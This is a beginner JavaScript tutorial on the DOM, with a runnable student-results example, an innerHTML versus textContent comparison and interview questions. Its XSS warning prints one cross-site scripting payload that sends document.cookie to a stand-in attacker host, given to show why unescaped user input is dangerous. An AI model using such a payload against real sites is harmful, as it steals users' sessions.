The page has a table of students and a button, and your code has never been
introduced to either. The introduction is the **DOM** (Document Object Model):
when the browser reads your HTML it builds a tree of objects, one per element,
and JavaScript can read that tree, change it, and listen to it. Change the tree
and the screen changes with it.

## Why this matters in a job

Because this is what front-end work is at the bottom of every framework:
find an element, change it. Libraries hide it, but the bugs they produce are
DOM bugs, and when a page shows the wrong thing you debug it in the browser's
Elements panel, which is the DOM. In interviews you will be asked what the DOM
is, the difference between `querySelector` and `getElementById`, between
`textContent`, `innerText` and `innerHTML`, and how to add an element to a
list without rebuilding the whole list.

## A family tree of the page

Your HTML is text. The DOM is the **family tree** the browser draws from it.
`<html>` is the ancestor; `<head>` and `<body>` are its children; a `<ul>` is a
parent of its `<li>` items, which are siblings. Every box in the tree is a
**node**, and the ones made from tags are **elements**. Each one is an object
with properties you can read and set, and methods you can call.

```html [results.html]
<body>
  <h2 id="title">CSE results</h2>
  <ul id="list" class="results"></ul>
</body>
```

::flow{direction="vertical" caption="The tree the browser builds from that HTML"}
  :::flow-step{label="document" icon="i-lucide-file"}
  The root. Your way in: `document.querySelector(...)`.
  :::
  :::flow-step{label="html, then body" icon="i-lucide-folder-tree"}
  Parents of everything you wrote.
  :::
  :::flow-step{label="h2#title and ul#list" icon="i-lucide-list" highlight}
  Siblings, children of `body`. These are what your code will find and change.
  :::
::

The HTML file is never edited. JavaScript changes the tree in memory, and the
browser repaints the screen from the tree. Reload the page and your changes are
gone, because the tree is built again from the file.

## How it works

Three jobs: **find** an element, **change** it, **create** new ones.

```javascript [dom-basics.js]
// Find
document.getElementById("title");            // by id, one element or null
document.querySelector("#list");             // first match for any CSS selector, or null
document.querySelectorAll(".results li");    // every match, as a NodeList

// Change
const title = document.querySelector("#title");
title.textContent = "CSE results, semester 5";   // the text inside
title.classList.add("highlight");                // classes: add, remove, toggle, contains
title.setAttribute("aria-live", "polite");       // any attribute
title.style.color = "darkgreen";                 // inline style: prefer classes

// Create
const li = document.createElement("li");
li.textContent = "Anita Rao: 78";
li.dataset.roll = "CSE001";                      // becomes data-roll="CSE001"
document.querySelector("#list").append(li);      // add as the last child

// Remove
li.remove();
```

Now all of it together, running. Press Run and the rendered page appears
below the code.

::runner{lang="html"}
```html
<h2 id="title">CSE results</h2>
<ul id="list"></ul>
<p id="summary"></p>

<style>
  .fail { color: crimson; }
  .topper { font-weight: bold; }
</style>

<script>
  const students = [
    { roll: "CSE001", name: "Anita Rao",   mark: 78 },
    { roll: "CSE002", name: "Vikram Shah", mark: 35 },
    { roll: "CSE003", name: "Priya Nair",  mark: 91 }
  ];

  const list = document.querySelector("#list");
  const best = Math.max(...students.map(s => s.mark));

  for (const s of students) {
    const li = document.createElement("li");
    li.textContent = `${s.name}: ${s.mark}`;
    li.dataset.roll = s.roll;
    if (s.mark < 40) li.classList.add("fail");
    if (s.mark === best) li.classList.add("topper");
    list.append(li);
  }

  const passed = students.filter(s => s.mark >= 40).length;
  document.querySelector("#summary").textContent =
    `${passed} of ${students.length} passed`;
</script>
```
::

```text [Output]
CSE results
  • Anita Rao: 78
  • Vikram Shah: 35        (in red)
  • Priya Nair: 91         (in bold)
2 of 3 passed
```

### Three ways to set content, one of them dangerous

| Property | Reads / writes | Parsed as HTML? |
| --- | --- | --- |
| `textContent` | All the text, including hidden elements | No. Always safe |
| `innerText` | Only the visible text, respecting CSS | No, but slower: it has to work out layout |
| `innerHTML` | The markup inside the element | **Yes**. Dangerous with user input |

::warning{icon="i-lucide-alert-triangle"}
`element.innerHTML = userInput` is the front-end version of building SQL by
joining strings. If a student's name is entered as
`<img src=x onerror="fetch('https://attacker.example/?c='+document.cookie)">`
the browser creates the image, it fails to load, and the attacker's code runs
with the logged-in user's session. That is **cross-site scripting** (XSS).
Use `textContent` for anything that came from a user.
::

## Real use case

Rendering a list from data is the most common DOM job there is. The slow and
unsafe version is the one most freshers write first:

::compare{caption="Rendering 400 students"}
  :::compare-side{label="innerHTML += in a loop" verdict="wrong"}
  ```javascript
  list.innerHTML = "";
  for (const s of students) {
    list.innerHTML += `<li>${s.name}</li>`;
  }
  ```
  Every `+=` makes the browser re-read and rebuild the **whole** list, so 400
  students is 400 rebuilds. And `s.name` goes in as markup, unescaped.
  :::
  :::compare-side{label="Build the elements, add them once" verdict="right"}
  ```javascript
  const items = students.map(s => {
    const li = document.createElement("li");
    li.textContent = s.name;
    return li;
  });
  list.replaceChildren(...items);
  ```
  One change to the live tree, and names are text, so nothing in them can run.
  :::
::

Where your script tag sits matters too. A `<script>` in the `<head>` runs
before the body exists, so `querySelector("#list")` returns `null` and the next
line throws `Cannot read properties of null`. Put scripts at the end of
`<body>`, or add `defer` (`<script src="results.js" defer></script>`), which
waits until the HTML is parsed. For code that must wait explicitly,
`document.addEventListener("DOMContentLoaded", ...)` fires at the same moment.

## What confuses people here

**`querySelectorAll` returns a NodeList, not an array.** It has `forEach` but
not `map` or `filter`. Convert with `[...nodeList]` or `Array.from(nodeList)`.
It is also a **snapshot**: elements added later are not in it. The older
`getElementsByClassName` returns an HTMLCollection that is **live** and updates
itself, which is a surprise inside a loop that adds elements.

**`null` from a selector.** A typo in the selector, or a script that runs
before the element exists, gives `null`, and the error appears on the next
line, not on the line with the mistake.

## Interview questions

::accordion
  :::accordion-item{label="What is the DOM?" icon="i-lucide-message-circle"}
  The Document Object Model: the tree of objects the browser builds from the
  HTML, one node per element, text and comment. JavaScript reads and changes
  that tree, and the browser redraws the page from it. It is not the HTML file:
  changing the DOM does not change the file, and a reload rebuilds it.
  :::

  :::accordion-item{label="Difference between getElementById, querySelector and querySelectorAll?" icon="i-lucide-message-circle"}
  `getElementById("list")` finds one element by id and is the fastest.
  `querySelector("#list li.fail")` takes any CSS selector and returns the first
  match or `null`. `querySelectorAll` returns every match as a static NodeList.
  :::

  :::accordion-item{label="Difference between textContent, innerText and innerHTML?" icon="i-lucide-message-circle"}
  `textContent` is all the text, never parsed, and fast. `innerText` is only the
  visible text as styled, so it triggers a layout calculation. `innerHTML` reads
  or writes markup, which is parsed, so setting it from user input allows XSS.
  Default to `textContent`.
  :::

  :::accordion-item{label="How do you add an element to the page?" icon="i-lucide-message-circle"}
  ```javascript
  const li = document.createElement("li");
  li.textContent = "Priya Nair: 91";
  document.querySelector("#list").append(li);
  ```

  `append` adds at the end, `prepend` at the start, `before` and `after` next to
  an element. For many items, build them first and add them in one call.
  :::

  :::accordion-item{label="Why does document.querySelector return null even though the element is in the HTML?" icon="i-lucide-message-circle"}
  Usually because the script ran before the browser had parsed that element: a
  `<script>` in the `<head>` without `defer`. Move it to the end of `<body>`,
  add `defer`, or wait for `DOMContentLoaded`. The other cause is a selector
  typo, such as `"list"` instead of `"#list"`.
  :::
::
